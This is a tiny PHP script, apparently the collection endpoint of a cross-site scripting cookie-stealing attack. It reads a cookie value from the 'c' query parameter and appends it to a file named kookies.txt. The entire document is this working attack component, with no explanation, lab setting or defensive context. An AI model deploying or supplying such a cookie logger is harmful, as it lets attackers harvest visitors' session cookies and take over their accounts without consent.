<?php
$cookie = $_GET['c'];
$fp = fopen('kookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);
?>